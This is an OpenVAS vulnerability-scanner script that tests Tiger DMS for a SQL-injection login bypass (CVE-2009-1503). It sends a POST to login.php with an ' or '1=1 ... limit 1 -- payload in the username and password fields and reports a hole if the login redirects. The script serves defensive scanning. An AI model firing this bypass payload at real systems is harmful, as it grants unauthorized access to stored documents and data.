###############################################################################
# OpenVAS Vulnerability Test
# $Id: tiger_dms_34775.nasl 15 2013-10-27 12:49:54Z jan $
#
# Tiger DMS Login SQL Injection Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Tiger DMS is prone to an SQL-injection vulnerability because it
  fails to sufficiently sanitize user-supplied data before using it in
  an SQL query.

  Exploiting this issue could allow an attacker to compromise the
  application, access or modify data, or exploit latent
  vulnerabilities in the underlying database.";


if (description)
{
 script_id(100173);
 script_version("$Revision: 15 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2009-05-02 19:46:33 +0200 (Sat, 02 May 2009)");
 script_cve_id("CVE-2009-1503");
 script_bugtraq_id(34775);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");

 script_name("Tiger DMS Login SQL Injection Vulnerability");
 desc = "

 Summary:
 " + tag_summary;


 script_description(desc);
 script_summary("Determine if Tiger DMS is vulnerable to SQL Injection");
 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/34775");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/dms",cgi_dirs());
foreach dir (dirs) {

    url = string(dir, "/login.php");
    req = http_get(item:url, port:port);
    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
    if( buf == NULL )continue;

    if(egrep(pattern: 'Powered by <a href=[^>]+>Tiger DMS</a>', string: buf) ) {
            sess = eregmatch(pattern: "Set-Cookie: ([a-zA-Z0-9]+)=([a-f0-9]{32})", string: buf);
	    
	    variables = string(sess[1],"=",sess[2],"&username=%27%20or%20%271=1&password=%27%20or%20%271=1%27%20limit%201%20--%20&login=Submit");
	    filename = string(dir,"/login.php");
	    host=get_host_name();

	    req = string(
	      "POST ", filename, " HTTP/1.1\r\n", 
	      "Referer: ","http://", host, filename, "\r\n",
	      "Host: ", host, ":", port, "\r\n", 
	      "Content-Type: application/x-www-form-urlencoded\r\n", 
	      "Content-Length: ", strlen(variables), 
	      "\r\n\r\n", 
	      variables
	    );
;
	    result = http_send_recv(port:port, data:req, bodyonly:FALSE);
	    if( result == NULL )continue;

	    if(egrep(pattern: "Location: index.php", string: result)) 
	     {
	         security_hole(port);
	         exit(0);
	     }
    }
}

exit(0);
